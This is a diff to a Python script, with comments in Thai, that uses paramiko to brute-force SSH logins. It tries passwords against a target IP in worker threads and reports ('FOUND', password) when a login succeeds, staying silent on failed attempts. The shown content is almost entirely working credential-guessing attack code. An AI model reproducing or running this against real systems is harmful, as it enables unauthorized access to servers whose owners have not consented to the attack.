@@ -18,15 +18,22 @@ def try_ssh_login(password, result_queue):
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         ssh.connect(TARGET_IP, username=USERNAME, password=password, timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
-        ssh.connect(
-            TARGET_IP,
-            username=USERNAME,
+        # ถ้าเข้าได้ แสดงว่าเจอรหัสถูก
+        result_queue.put(('FOUND', password))
+        ssh.close()
+        return True
     except paramiko.AuthenticationException:
         # รหัสผิด ไม่มีอะไรต้องแสดง
         pass
     except Exception:
         # อื่นๆ เช่น timeout, network error
         pass
+    finally:
+        try:
+            ssh.close()
+        except:
+            pass
+    return False
 
 
 def worker(password_queue, result_queue, stop_event):
